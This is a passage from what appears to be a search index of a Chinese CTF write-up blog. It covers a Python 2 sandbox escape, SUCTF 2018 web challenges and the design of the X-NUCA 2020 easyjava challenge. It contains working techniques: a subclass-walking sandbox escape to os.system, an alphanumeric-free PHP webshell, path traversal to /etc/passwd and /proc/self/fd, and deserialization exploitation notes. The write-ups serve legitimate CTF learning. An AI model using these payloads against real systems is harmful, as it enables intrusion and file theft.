] .__ class __.__ base __   < type   ' object ' >   \u53ef\u4ee5 \u770b\u5230 \u8fd4\u56de object \u5bf9\u8c61 \uff0c \u56e0\u4e3a python \u4e2d \u4e00\u5207 \u5747 \u4e3a \u5bf9\u8c61 \uff0c \u5747 \u7ee7\u627f object \u5bf9\u8c61 \uff0c \u5f97\u5230 object \u4e4b\u540e \u6211\u4eec \u5c31 \u53ef \u5728 \u901a\u8fc7 \u5c5e\u6027 __ subclasses __ \u6765 \u67e5\u770b object \u7684 \u5b50\u7c7b \uff08 \u5305\u62ec \u6240\u6709 \u7684 \u5185\u7f6e \u7c7b \uff09   > > >   [ ] .__ class __.__ base __.__ subclasses __ ( )   [ < type   ' type ' > ,   < type   ' weakref ' > ,   < type   ' weakcallableproxy ' > ,   < type   ' weakproxy ' > ,   < type   ' int ' > ,   < type   ' basestring ' > ,   < type   ' bytearray ' > ,   < type   ' list ' > ,   < type   ' NoneType ' > ,   < type   ' NotImplementedType ' > ,   < type   ' traceback ' > ,   < type   ' super ' > ,   < type   ' xrange ' > ,   < type   ' dict ' > ,   < type   ' set ' > ,   < type   ' slice ' > ,   < type   ' staticmethod ' > ,   < type   ' complex ' > ,   < type   ' float ' > ,   < type   ' buffer ' > ,   < type   ' long ' > ,   < type   ' frozenset ' > ,   < type   ' property ' > ,   < type   ' memoryview ' > ,   < type   ' tuple ' > ,   < type   ' enumerate ' > ,   < type   ' reversed ' > ,   < type   ' code ' > ,   < type   ' frame ' > ,   < type   ' builtin _ function _ or _ method ' > ,   < type   ' instancemethod ' > ,   < type   ' function ' > ,   < type   ' classobj ' > ,   < type   ' dictproxy ' > ,   < type   ' generator ' > ,   < type   ' getset _ descriptor ' > ,   < type   ' wrapper _ descriptor ' > ,   < type   ' instance ' > ,   < type   ' ellipsis ' > ,   < type   ' member _ descriptor ' > ,   < type   ' file ' > ,   < type   ' PyCapsule ' > ,   < type   ' cell ' > ,   < type   ' callable - iterator ' > ,   < type   ' iterator ' > ,   < type   ' sys . long _ info ' > ,   < type   ' sys . float _ info ' > ,   < type   ' EncodingMap ' > ,   < type   ' fieldnameiterator ' > ,   < type   ' formatteriterator ' > ,   < type   ' sys . version _ info ' > ,   < type   ' sys . flags ' > ,   < type   ' exceptions . BaseException ' > ,   < type   ' module ' > ,   < type   ' imp . NullImporter ' > ,   < type   ' zipimport . zipimporter ' > ,   < type   ' posix . stat _ result ' > ,   < type   ' posix . statvfs _ result ' > ,   < class   ' warnings . WarningMessage ' > ,   < class   ' warnings . catch _ warnings ' > ,   < class   ' _ weakrefset ._ IterationGuard ' > ,   < class   ' _ weakrefset . WeakSet ' > ,   < class   ' _ abcoll . Hashable ' > ,   < type   ' classmethod ' > ,   < class   ' _ abcoll . Iterable ' > ,   < class   ' _ abcoll . Sized ' > ,   < class   ' _ abcoll . Container ' > ,   < class   ' _ abcoll . Callable ' > ,   < type   ' dict _ keys ' > ,   < type   ' dict _ items ' > ,   < type   ' dict _ values ' > ,   < class   ' site ._ Printer ' > ,   < class   ' site ._ Helper ' > ,   < type   ' _ sre . SRE _ Pattern ' > ,   < type   ' _ sre . SRE _ Match ' > ,   < type   ' _ sre . SRE _ Scanner ' > ,   < class   ' site . Quitter ' > ,   < class   ' codecs . IncrementalEncoder ' > ,   < class   ' codecs . IncrementalDecoder ' > ]   \u56de\u5230 \u6211\u4eec \u7684 \u4e3b\u8981 \u76ee\u7684 \u4e0a \uff0c \u6211\u4eec \u9700\u8981 \u8bfb\u53d6 flag \u6587\u4ef6 \u4e2d \u7684 \u5185\u5bb9 \uff0c \u5728 \u8fd9\u4e9b \u5b50\u7c7b \u4e2d\u6709 \u54ea\u4e9b \u662f \u53ef\u4ee5 \u7528\u6765 \u8bfb\u53d6 \u6587\u4ef6 \u5185\u5bb9 \u7684 \u5462 \uff1f \u7b54\u6848 \u662f file \u5b50\u7c7b \uff0c \u9996\u5148 \u67e5\u627e \u4e00\u4e0b file \u5b50\u7c7b \u7684 \u4f4d\u7f6e \u3002   > > >   [ ] .__ class __.__ base __.__ subclasses __ ( ) . index ( file )   40   \u8fd9\u6837 \u6211\u4eec \u5c31 \u53ef\u4ee5 \u901a\u8fc7 \u8fd9\u4e2a \u6765 \u5efa\u7acb \u4e00\u4e2a file \u7c7b \u7684 \u522b\u540d \u8bfb \u6587\u4ef6 \u5566 \uff1a \uff09   > > >   f = [ ] .__ class __.__ base __.__ subclasses __ ( ) [ 40 ]   > > >   f ( ' . / flag . txt ' ) . read ( )   \uff1f \uff1f \uff1f \u6ca1\u6709 \u4efb\u4f55 \u5185\u5bb9 \u6253\u5370 \u51fa\u6765 \uff0c \u4f46\u662f \u4ed6 \u6ca1\u6709 \u62a5\u9519 \u8bf4\u660e \u5b58\u5728 flag . txt \u6587\u4ef6 \uff0c \u6211\u4eec \u5c1d\u8bd5 \u7528 \u4ed6 \u7ed9 \u7684 print \u51fd\u6570 \u6765 \u6253\u5370   > > >   print ( f ( ' . / flag . txt ' ) . read ( ) )   This   is   a   Flag { enjoy _ yourself _ ctfer }   \u5f97\u5230 flag","title":"\u65b9\u6cd5 \u4e00"},{"location":"writeups/2018/old-python-sandbox-escape/#_5","text":"\u540c\u6837 \u7684 \u8fd8\u6709 \u4e00\u79cd \u65b9\u6cd5 \u5c31\u662f \u4f7f\u7528 os \u6a21\u5757 \u6765 \u6267\u884c \u7cfb\u7edf \u547d\u4ee4 \u7cfb\u7edf\u547d\u4ee4 system \uff0c \u4f46\u662f os \u88ab \u5c4f\u853d   > > >   import   os   No   bueno   \u6211\u4eec \u5f97 \u60f3 \u5176\u4ed6 \u529e\u6cd5 \u6765 \u83b7\u53d6 shell \u3002 \u901a\u8fc7 \u4e0a\u9762 \u7684 \u601d\u8def \uff0c \u6211\u4eec \u9700\u8981 \u627e \u4e00\u4e2a \u5b50\u7c7b \u4ed6 \u80fd \u8c03\u7528 os \u6a21\u5757 \uff0c \u8fd9\u91cc \u7528\u5230 \u4e86   warnings . catch _ warnings   \u7c7b   > > >   import   warnings   > > >   [ ] .__ class __.__ base __.__ subclasses __ ( ) . index ( warnings . catch _ warnings )   59   > > >   [ ] .__ class __.__ base __.__ subclasses __ ( ) [ 59 ]   < class   ' warnings . catch _ warnings ' >   > > >   [ ] .__ class __.__ base __.__ subclasses __ ( ) [ 59 ] .__ init __. func _ globals . keys ( )   [ ' filterwarnings ' ,   ' once _ registry ' ,   ' WarningMessage ' ,   ' _ show _ warning ' ,   ' filters ' ,   ' _ setoption ' ,   ' showwarning ' ,   ' __ all __ ' ,   ' onceregistry ' ,   ' __ package __ ' ,   ' simplefilter ' ,   ' default _ action ' ,   ' _ getcategory ' ,   ' __ builtins __ ' ,   ' catch _ warnings ' ,   ' __ file __ ' ,   ' warnpy3k ' ,   ' sys ' ,   ' __ name __ ' ,   ' warn _ explicit ' ,   ' types ' ,   ' warn ' ,   ' _ processoptions ' ,   ' defaultaction ' ,   ' __ doc __ ' ,   ' linecache ' ,   ' _ OptionError ' ,   ' resetwarnings ' ,   ' formatwarning ' ,   ' _ getaction ' ]   \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \u518d \u627e   linecache   > > >   [ ] .__ class __.__ base __.__ subclasses __ ( ) [ 59 ] .__ init __. func _ globals . keys ( ) . index ( ' linecache ' )   25   > > >   [ ] .__ class __.__ base __.__ subclasses __ ( ) [ 59 ] .__ init __. func _ globals [ ' linecache ' ] .__ dict __. keys ( )   [ ' updatecache ' ,   ' clearcache ' ,   ' __ all __ ' ,   ' __ builtins __ ' ,   ' __ file __ ' ,   ' cache ' ,   ' checkcache ' ,   ' getline ' ,   ' __ package __ ' ,   ' sys ' ,   ' getlines ' ,   ' __ name __ ' ,   ' os ' ,   ' __ doc __ ' ]   \u53ef\u4ee5 \u770b\u5230 \u8fd9\u91cc \u53ef\u4ee5 \u8c03\u7528 os \u6a21\u5757 \uff0c \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \u5c31 \u8c03\u7528 system \u51fd\u6570 \u4e86   > > >   [ ] .__ class __.__ base __.__ subclasses __ ( ) [ 59 ] .__ init __. func _ globals [ ' linecache ' ] .__ dict __. values ( ) [ 12 ]   < module   ' os '   from   ' / usr / lib / python2.7 / os . pyc ' >   > > >   [ ] .__ class __.__ base __.__ subclasses __ ( ) [ 59 ] .__ init __. func _ globals [ ' linecache ' ] .__ dict __. values ( ) [ 12 ] .__ dict __. keys ( ) . index ( ' system ' )   144   \u6574\u7406 \u4e00\u4e0b   > > >   a = [ ] .__ class __.__ base __.__ subclasses __ ( ) [ 59 ] .__ init __. func _ globals [ ' linecache ' ] .__ dict __. values ( ) [ 12 ]   > > >   a   < module   ' os '   from   ' / usr / lib / python2.7 / os . pyc ' >   > > >   s = a .__ dict __. keys ( ) . index ( ' system ' )   > > >   s   144   > > >   s = a .__ dict __. keys ( ) [ 144 ]   > > >   s   ' system '   > > >   s = a .__ dict __. values ( ) [ 144 ]   > > >   s ( ' pwd ' )   / home / xxxx / Desktop / code / python - code / test   \u597d \u4e86 \u73b0\u5728 \u53ef\u4ee5 \u6267\u884c \u7cfb\u7edf \u547d\u4ee4 \u7cfb\u7edf\u547d\u4ee4 \u4e86 \uff0c cat \u4e00\u4e0b flag   > > >   s ( ' cat   flag . txt ' )   This   is   a   Flag { enjoy _ yourself _ ctfer }","title":"\u65b9\u6cd5 \u4e8c"},{"location":"writeups/2018/old-python-sandbox-escape/#_6","text":"\u901a\u8fc7 \u4e0a\u9762 \u7684 python \u6c99\u76d2 \u9003\u9038 \uff0c \u53d1\u73b0 \u8bfb python \u5b98\u7f51 \u624b\u518c \u8fd8\u662f \u5f88 \u6709 \u5fc5\u8981 \u7684 \uff0c \u627e\u4e2a \u65f6\u95f4 \u4e00\u70b9 \u4e00\u70b9 \u4e00\u70b9\u4e00\u70b9 \u770b \uff1a \uff09 \u5171\u52c9","title":"\u603b\u7ed3"},{"location":"writeups/2018/old-python-sandbox-escape/#_7","text":"https : / / hexplo . it / escaping - the - csawctf - python - sandbox /","title":"\u53c2\u8003"},{"location":"writeups/2018/suctf-part-web-writeup-20180528/","tags":["ctf"],"text":"SUCTF   \u62bd \u4e86 \u70b9 \u65f6\u95f4 \u505a \u4e86 2 \u9053 SUCTF \u7684 web \u9898 \uff0c \u8bb0\u5f55 \u4e00\u4e0b writeup \u3002   Anonymous   \u8003\u70b9   php \u7684 \u52a8\u6001 \u51fd\u6570 \u6267\u884c \uff0c \u4ee5\u53ca create _ function \u6240 \u8fd4\u56de \u7684 \u533f\u540d \u51fd\u6570   wp   \u8bbf\u95ee \u9898\u76ee \uff0c \u76f4\u63a5 \u7ed9 \u4e86 \u6e90\u7801   $ MY   =   create _ function ( \" \" , \" some   code \" ) ;   / /   \u6267\u884c \u4e86 cat \u547d\u4ee4 \uff0c \u8bfb\u53d6 flag \u5185\u5bb9   $ hash   =   bin2hex ( openssl _ random _ pseudo _ bytes ( 32 ) ) ;   eval ( \" function   ' SUCTF _ ' . $ hash ( ) { \"   . \" global   \\ $ MY ; \"   . \" \\ $ MY ( ) ; \"   . \" } \" ) ;   if ( isset ( $ _ GET [ ' func _ name ' ] ) ) {   $ _ GET [ \" func _ name \" ] ( ) ;   die ( ) ;   }   \u601d\u8def \u6bd4\u8f83 \u660e\u786e \uff0c \u5c31\u662f \u60f3 \u529e\u6cd5 \u6267\u884c create _ function \u6240 \u4ea7\u751f \u7684 \u533f\u540d \u51fd\u6570 \u3002   \u800c \u5176\u4e2d SUCTF _ 32 \uff0c \u8fd9\u4e2a \u51fd\u6570 \u660e\u786e \u662f \u6ca1 \u529e\u6cd5 \u7206\u7834 \u51fa\u6765 \u7684 \u3002 \u90a3\u4e48 \u5c31 \u53ea\u80fd \u5728   $ MY   \u4e0a \u529f\u592b \u4e0b\u529f\u592b \u3002   \u6253\u5370 \u4e00\u4e0b   $ MY   \u7684 \u503c \uff0c \u53d1\u73b0 create _ function \u8fd4\u56de \u4e86   \\ 0lambda _ { number }   , \u90a3\u4e48 \u5c31 \u5f88 \u660e\u786e \u4e86 \uff0c \u53ea\u8981 \u66b4\u529b \u4e00\u4e0b \u8fd9\u4e2a number \u5c31 \u6709 \u4e00\u5b9a \u51e0\u7387 \u6267\u884c \u8be5 \u51fd\u6570 \uff0c \u8fd9\u91cc \u6211 \u66b4\u529b \u4e86 \u5927\u6982 1000 \u591a \u5c31 \u6709 2 \u6761 \u6267\u884c \u4e86   Getshell   \u8003\u70b9   https : / / www . leavesongs . com / PENETRATION / webshell - without - alphanum . html   wp   \u9996\u5148 \u786e\u5b9a \u53ef\u7528 \u5b57\u7b26 \uff0c \u4f7f\u7528 bp \u5c06 \u6240\u6709 \u53ef\u89c1 \u5b57\u7b26 \u66b4\u529b \u4e00\u904d \u540e \u53d1\u73b0 \u53ef \u6253\u5370 \u5b57\u7b26 \u4e3a   $   ( )   [ ]   _   ~   .   ;   =   \uff0c \u4ee5\u53ca \u5176\u4ed6 \u4e0d\u53ef \u6253\u5370 \u5b57\u7b26 \u3002   \u6839\u636e p \u725b \u7684 \u535a\u5ba2 \uff0c \u53d1\u73b0 \u53d6\u53cd \u4e2d\u6587 \u53ef\u4ee5 \u8d77\u5230 \u4f5c\u7528 \uff0c \u6d4b\u8bd5   ~ ( { \u4e2d\u6587 } )   \u53d1\u73b0 \u53ef \u6839\u636e \u4e2d\u6587 \u7684 utf - 8 \u7f16\u7801 \u7684 \u4e2d\u95f4 2 \u4e2a hex \u7801 \u8fdb\u884c \u5bf9 \u5b57\u6bcd \u7684 \u904d\u5386   http : / / www . herongyang . com / gb2312 _ gb / pinyin _ 32 . html   \u51d1\u51fa \u5b57\u7b26   assert   \uff0c   _ GET   \uff0c \u5e76 \u52a8\u6001 \u6267\u884c \u3002   \u4e3a\u4e86 \u51d1\u51fa \u4e0a\u9762 \u7684 \u5b57\u7b26 \uff0c \u6211 \u91c7\u7528 \u9010\u4e2a \u53cd \u53d6\u53cd   bin2hex ( ~ ( ' a ' ) )   \u83b7\u5f97 \u4e2d\u6587 utf - 8 \u7f16\u7801 \u7684 \u4e2d\u95f4 2 \u4e2a \uff0c \u641c\u8868 \u5373\u53ef \u627e\u5230 \u5bf9\u5e94 \u7684 \u4e2d\u6587 \uff0c \u5199 \u4e00\u4e0b \u6211 \u7684 getshell \u4ee3\u7801   < ? php   $ _ = ~ ( \u778e ) ;   $ __. = $ _ [ [ ] = = [ ] ] ;   $ _ = ~ ( \u631f ) ;   $ __. = $ _ [ [ ] = = [ ] ] ;   $ _ = ~ ( \u631f ) ;   $ __. = $ _ [ [ ] = = [ ] ] ;   $ _ = ~ ( \u9699 ) ;   $ __. = $ _ [ [ ] = = [ ] ] ;   $ _ = ~ ( \u5378 ) ;   $ __. = $ _ [ [ ] = = [ ] ] ;   $ _ = ~ ( \u52cb ) ;   $ __. = $ _ [ [ ] = = [ ] ] ;   $ _ = ~ ( \u6821 ) ;   $ ___. = $ _ [ [ ] = = [ ] ] ;   $ _ = ~ ( \u4e0b ) ;   $ ___. = $ _ [ [ ] = = [ ] ] ;   $ _ = ~ ( \u7ea4 ) ;   $ ___. = $ _ [ [ ] = = [ ] ] ;   $ _ = ~ ( \u5acc ) ;   $ ___. = $ _ [ [ ] = = [ ] ] ;   $ ___ = $ $ ___ ;   $ __ ( $ ___ [ _ ] ) ;   \u4e0a\u4f20 \u4e86 shell \u4e4b\u540e \u5c31 \u6bd4\u8f83 \u5bb9\u6613 \u4e86 \uff0c \u7ffb \u76ee\u5f55 \u5373\u53ef   system ( ' ls   / ' )   system ( ' cat   / Th1s _ 14 _ f14g ' )   \u603b\u7ed3   \u8bb0\u5f55 \u4e00\u4e0b getshell \u7684 \u5751\u70b9   1 .   eval \u4e0d\u662f \u51fd\u6570 \uff0c \u662f \u8bed\u53e5   2 .   \u4e0d\u7528 \u5f15\u53f7 \uff0c \u7528 \u4e2d\u6587 \u4e5f \u88ab php \u5f53\u4f5c \u662f \u5b57\u7b26 \u5b57\u7b26\u4e32   3 .   UTF - 8 \u7f16\u7801   http : / / www . herongyang . com / gb2312 _ gb / pinyin _ 32 . html","title":"SUCTF   2018   \u90e8\u5206 web   writeup"},{"location":"writeups/2018/suctf-part-web-writeup-20180528/#suctf","text":"\u62bd \u4e86 \u70b9 \u65f6\u95f4 \u505a \u4e86 2 \u9053 SUCTF \u7684 web \u9898 \uff0c \u8bb0\u5f55 \u4e00\u4e0b writeup \u3002","title":"SUCTF"},{"location":"writeups/2018/suctf-part-web-writeup-20180528/#anonymous","text":"","title":"Anonymous"},{"location":"writeups/2018/suctf-part-web-writeup-20180528/#_1","text":"php \u7684 \u52a8\u6001 \u51fd\u6570 \u6267\u884c \uff0c \u4ee5\u53ca create _ function \u6240 \u8fd4\u56de \u7684 \u533f\u540d \u51fd\u6570","title":"\u8003\u70b9"},{"location":"writeups/2018/suctf-part-web-writeup-20180528/#wp","text":"\u8bbf\u95ee \u9898\u76ee \uff0c \u76f4\u63a5 \u7ed9 \u4e86 \u6e90\u7801   $ MY   =   create _ function ( \" \" , \" some   code \" ) ;   / /   \u6267\u884c \u4e86 cat \u547d\u4ee4 \uff0c \u8bfb\u53d6 flag \u5185\u5bb9   $ hash   =   bin2hex ( openssl _ random _ pseudo _ bytes ( 32 ) ) ;   eval ( \" function   ' SUCTF _ ' . $ hash ( ) { \"   . \" global   \\ $ MY ; \"   . \" \\ $ MY ( ) ; \"   . \" } \" ) ;   if ( isset ( $ _ GET [ ' func _ name ' ] ) ) {   $ _ GET [ \" func _ name \" ] ( ) ;   die ( ) ;   }   \u601d\u8def \u6bd4\u8f83 \u660e\u786e \uff0c \u5c31\u662f \u60f3 \u529e\u6cd5 \u6267\u884c create _ function \u6240 \u4ea7\u751f \u7684 \u533f\u540d \u51fd\u6570 \u3002   \u800c \u5176\u4e2d SUCTF _ 32 \uff0c \u8fd9\u4e2a \u51fd\u6570 \u660e\u786e \u662f \u6ca1 \u529e\u6cd5 \u7206\u7834 \u51fa\u6765 \u7684 \u3002 \u90a3\u4e48 \u5c31 \u53ea\u80fd \u5728   $ MY   \u4e0a \u529f\u592b \u4e0b\u529f\u592b \u3002   \u6253\u5370 \u4e00\u4e0b   $ MY   \u7684 \u503c \uff0c \u53d1\u73b0 create _ function \u8fd4\u56de \u4e86   \\ 0lambda _ { number }   , \u90a3\u4e48 \u5c31 \u5f88 \u660e\u786e \u4e86 \uff0c \u53ea\u8981 \u66b4\u529b \u4e00\u4e0b \u8fd9\u4e2a number \u5c31 \u6709 \u4e00\u5b9a \u51e0\u7387 \u6267\u884c \u8be5 \u51fd\u6570 \uff0c \u8fd9\u91cc \u6211 \u66b4\u529b \u4e86 \u5927\u6982 1000 \u591a \u5c31 \u6709 2 \u6761 \u6267\u884c \u4e86","title":"wp"},{"location":"writeups/2018/suctf-part-web-writeup-20180528/#getshell","text":"","title":"Getshell"},{"location":"writeups/2018/suctf-part-web-writeup-20180528/#_2","text":"https : / / www . leavesongs . com / PENETRATION / webshell - without - alphanum . html","title":"\u8003\u70b9"},{"location":"writeups/2018/suctf-part-web-writeup-20180528/#wp_1","text":"\u9996\u5148 \u786e\u5b9a \u53ef\u7528 \u5b57\u7b26 \uff0c \u4f7f\u7528 bp \u5c06 \u6240\u6709 \u53ef\u89c1 \u5b57\u7b26 \u66b4\u529b \u4e00\u904d \u540e \u53d1\u73b0 \u53ef \u6253\u5370 \u5b57\u7b26 \u4e3a   $   ( )   [ ]   _   ~   .   ;   =   \uff0c \u4ee5\u53ca \u5176\u4ed6 \u4e0d\u53ef \u6253\u5370 \u5b57\u7b26 \u3002   \u6839\u636e p \u725b \u7684 \u535a\u5ba2 \uff0c \u53d1\u73b0 \u53d6\u53cd \u4e2d\u6587 \u53ef\u4ee5 \u8d77\u5230 \u4f5c\u7528 \uff0c \u6d4b\u8bd5   ~ ( { \u4e2d\u6587 } )   \u53d1\u73b0 \u53ef \u6839\u636e \u4e2d\u6587 \u7684 utf - 8 \u7f16\u7801 \u7684 \u4e2d\u95f4 2 \u4e2a hex \u7801 \u8fdb\u884c \u5bf9 \u5b57\u6bcd \u7684 \u904d\u5386   http : / / www . herongyang . com / gb2312 _ gb / pinyin _ 32 . html   \u51d1\u51fa \u5b57\u7b26   assert   \uff0c   _ GET   \uff0c \u5e76 \u52a8\u6001 \u6267\u884c \u3002   \u4e3a\u4e86 \u51d1\u51fa \u4e0a\u9762 \u7684 \u5b57\u7b26 \uff0c \u6211 \u91c7\u7528 \u9010\u4e2a \u53cd \u53d6\u53cd   bin2hex ( ~ ( ' a ' ) )   \u83b7\u5f97 \u4e2d\u6587 utf - 8 \u7f16\u7801 \u7684 \u4e2d\u95f4 2 \u4e2a \uff0c \u641c\u8868 \u5373\u53ef \u627e\u5230 \u5bf9\u5e94 \u7684 \u4e2d\u6587 \uff0c \u5199 \u4e00\u4e0b \u6211 \u7684 getshell \u4ee3\u7801   < ? php   $ _ = ~ ( \u778e ) ;   $ __. = $ _ [ [ ] = = [ ] ] ;   $ _ = ~ ( \u631f ) ;   $ __. = $ _ [ [ ] = = [ ] ] ;   $ _ = ~ ( \u631f ) ;   $ __. = $ _ [ [ ] = = [ ] ] ;   $ _ = ~ ( \u9699 ) ;   $ __. = $ _ [ [ ] = = [ ] ] ;   $ _ = ~ ( \u5378 ) ;   $ __. = $ _ [ [ ] = = [ ] ] ;   $ _ = ~ ( \u52cb ) ;   $ __. = $ _ [ [ ] = = [ ] ] ;   $ _ = ~ ( \u6821 ) ;   $ ___. = $ _ [ [ ] = = [ ] ] ;   $ _ = ~ ( \u4e0b ) ;   $ ___. = $ _ [ [ ] = = [ ] ] ;   $ _ = ~ ( \u7ea4 ) ;   $ ___. = $ _ [ [ ] = = [ ] ] ;   $ _ = ~ ( \u5acc ) ;   $ ___. = $ _ [ [ ] = = [ ] ] ;   $ ___ = $ $ ___ ;   $ __ ( $ ___ [ _ ] ) ;   \u4e0a\u4f20 \u4e86 shell \u4e4b\u540e \u5c31 \u6bd4\u8f83 \u5bb9\u6613 \u4e86 \uff0c \u7ffb \u76ee\u5f55 \u5373\u53ef   system ( ' ls   / ' )   system ( ' cat   / Th1s _ 14 _ f14g ' )","title":"wp"},{"location":"writeups/2018/suctf-part-web-writeup-20180528/#_3","text":"\u8bb0\u5f55 \u4e00\u4e0b getshell \u7684 \u5751\u70b9   1 .   eval \u4e0d\u662f \u51fd\u6570 \uff0c \u662f \u8bed\u53e5   2 .   \u4e0d\u7528 \u5f15\u53f7 \uff0c \u7528 \u4e2d\u6587 \u4e5f \u88ab php \u5f53\u4f5c \u662f \u5b57\u7b26 \u5b57\u7b26\u4e32   3 .   UTF - 8 \u7f16\u7801   http : / / www . herongyang . com / gb2312 _ gb / pinyin _ 32 . html","title":"\u603b\u7ed3"},{"location":"writeups/2020/xnuca-2020-easyjava/","tags":["ctf"],"text":"0x00   \u524d\u8a00   easyjava \u7684 \u8bbe\u8ba1 \u601d\u8def \u4e3b\u8981 \u6765\u6e90 \u6e90\u4e8e \u6765\u6e90\u4e8e \u73b0\u5b9e \u73af\u5883 \u4e2d \u9047\u5230 \u7684 \u4e00\u4e9b \u95ee\u9898 \uff0c \u4ee5\u53ca \u6700\u8fd1 \u521a\u51fa \u7684 mybatis \u4e8c\u7ea7 \u7f13\u5b58 \u4e8c\u7ea7\u7f13\u5b58 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u5b89\u5168 \u95ee\u9898 \u7684 \u4e00\u79cd \u8bbe\u60f3 \u3002 \u9898\u76ee \u7684 \u8bbe\u8ba1 \u76ee\u7684 \u4e3b\u8981 \u8003\u5bdf \u9009\u624b \u5bf9\u4e8e \u5b9e\u64cd\u6027 \u7684 \u6f0f\u6d1e \u7684 \u5229\u7528 \u4ee5\u53ca \u6e90\u7801 \u5ba1\u8ba1 \u80fd\u529b \u3002   \u5177\u4f53 \u7684 \u8003\u70b9 \u5982\u4e0b \uff1a   \u4efb\u610f \u6587\u4ef6 \u4e0b\u8f7d \uff0c / proc / self / fd \u7684 \u5229\u7528   mybatis \u7f13\u5b58 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6f0f\u6d1e \uff0c   CVE - 2020 - 26945   xstream \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \uff0c \u7b80\u5355 \u6b63\u5219 waf \u7ed5\u8fc7 \uff0c \u7c7b\u6bd4 fastjson   unicode \u7f16\u7801 \u7ed5\u8fc7   \u9ad8 \u7248\u672c java \u7248\u672c \u4e0b \u7684 jndi \u5229\u7528   0x01   \u9884\u671f \u9898\u89e3   \u9898\u76ee \u672c\u8eab \u8bbe\u8ba1 \u7684 \u529f\u80fd \u70b9 \u6bd4\u8f83 \u5c11 \uff0c \u4e3b\u8981 \u662f jpg \u56fe\u7247 \u7b7e\u540d \uff0c \u4e0b\u8f7d \u548c\u9a8c \u7b7e \u529f\u80fd   # 1   \u6e90\u7801 \u83b7\u53d6   \u8fd9\u91cc \u9996\u5148 \u5173\u6ce8 \u4e0b\u8f7d \u7684 \u63a5\u53e3   \u5728 \u8fd4\u56de \u5305 \u91cc \u5b58\u5728 Check \u5b57\u6bb5 \uff0c \u4e8e get \u8bf7\u6c42 \u4e2d \u7684 sign \u5b57\u6bb5 \u662f \u4e00\u6837 \u7684 \u5185\u5bb9 \uff0c \u5c1d\u8bd5 \u4fee\u6539 filename \u4e3a   .. / .. / .. / .. / .. / .. / etc / passwd   check \u5b57\u6bb5 \u8fd4\u56de \u4e86 \u4e0d \u4e00\u6837 \u7684 \u5185\u5bb9 \uff0c \u8fd9\u91cc \u5224\u65ad \u53ef\u80fd sign \u503c \u7528\u4e8e \u6821\u9a8c \uff0c \u901a\u8fc7 \u624d \u8fd4\u56de \u7ed3\u679c \uff0c \u90a3\u4e48 \u4fee\u6539 sign \u5b57\u6bb5 \uff0c \u5373\u53ef \u83b7\u53d6 \u5230 \u5f53\u524d \u8bf7\u6c42 \u7684 \u5185\u5bb9 \u3002 \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \uff0c \u7531\u4e8e \u662f linux \u7cfb\u7edf \uff0c \u6211\u4eec \u53ef\u4ee5 \u901a\u8fc7 \u66b4\u529b fd \u503c\u6765 \u83b7\u53d6 \u5230 \u5f53\u524d \u8fd0\u884c \u7684 jar \u5305 \u5185\u5bb9 \uff0c \u5982   / proc / self / fd / 4   \u6765 \u83b7\u53d6 jar \u5305   # 2   mybatis   SQL \u6ce8\u5165   \u62ff\u5230 jar \u7f16\u8bd1 \u53cd\u7f16\u8bd1 \u540e \u5148 \u770b pom \uff0c \u5176\u4e2d \u6bd4\u8f83 \u5bb9\u6613 \u5173\u6ce8 \u7684 \u4e3b\u8981 \u662f \u4e24\u4e2a jar \u5305 \uff0c \u4e00\u4e2a \u662f mybatis \u7684 springboot \u5305 \uff0c \u53e6 \u4e00\u4e2a \u662f xstream \u7684 \u5305   \u5982\u679c \u5173\u6ce8 cve \u52a8\u6001 \u7684\u8bdd \uff0c \u53ef\u4ee5 \u77e5\u9053 \u6700\u8fd1 \u521a\u51fa \u7684 \u6f0f\u6d1e   CVE - 2020 - 26945   \uff0c \u867d\u7136 mybatis \u7684 \u7248\u672c \u5df2\u7ecf \u8fdb\u884c \u4e86 \u5347\u7ea7 \uff0c \u4f46 spring \u7684 mybatis \u5305\u4e2d \u7684 mybatis \u4f9d\u8d56 \u5e76 \u6ca1\u6709 \u5347\u7ea7 \uff0c \u4ecd\u7136 \u662f 3.5 . 5 \u7248\u672c \uff0c \u518d \u786e\u5b9a \u4e00\u4e0b \uff0c \u662f\u5426 \u542f\u7528 \u4e86 cache   \u4ece mapper \u5bf9\u5e94 \u7684 xml \u914d\u7f6e \u91cc \u53ef\u4ee5 \u770b\u5230 \u5f00\u542f \u4e86 cache \u914d\u7f6e \uff0c \u5e76\u4e14   findByHashAndSecret   \u63a5\u53e3 \u5b58\u5728 \u6ce8\u5165 \u3002   \u5230 \u8fd9\u91cc \u5c31 \u7b80\u5355 \u4e86 \uff0c \u6211\u4eec \u53ea\u8981 \u627e \u4e00\u4e0b \uff0c \u8c03\u7528 \u70b9 \u786e\u8ba4 \u662f\u5426 \u53ef\u63a7 \uff0c \u5373\u53ef \u786e\u8ba4 \u662f\u5426 \u5b58\u5728 \u6ce8\u5165   nese . game . controller . CheckController   \u5b58\u5728 \u94fe\u8def \uff0c \u6587\u4ef6 \u4ece\u6587\u4ef6 \u4e2d \u83b7\u53d6 \u5185\u5bb9 \uff0c \u5e76 \u8fdb\u884c \u6570\u636e \u636e\u5e93 \u6570\u636e\u5e93 \u67e5\u8be2 \uff0c \u6240\u4ee5 \u8fd9\u8fb9 \u6211\u4eec \u80fd \u8fbe\u5230 \u4e00\u4e2a \u6ce8\u5165 \u7684 \u6548\u679c   # 3   mybatis \u4e8c\u7ea7 \u7f13\u5b58 \u4e8c\u7ea7\u7f13\u5b58 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6f0f\u6d1e   \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \uff0c \u7ee7\u7eed \u8fdb\u884c \u5ba1\u8ba1 \uff0c \u5173\u6ce8 \u4e00\u4e0b \u53e6 \u4e00\u4e2a \u4e00\u4e2a\u70b9 xstream \u5305 \u7684 \u5b89\u5168 \u95ee\u9898 \u3002 \u5728   nese . game . entity . Picture   \u5bf9\u8c61 \u4e0a \uff0c \u8c03\u7528 \u4e86 xstream \u7684 fromXML \u51fd\u6570 \uff0c \u5e76\u4e14 \u5728   readObject   \u51fd\u6570 \u5904 \u5bf9 \u5b57\u7b26 \u5b57\u7b26\u4e32 \u7c7b\u578b \u7684 xml \u8fdb\u884c \u8fd8\u539f   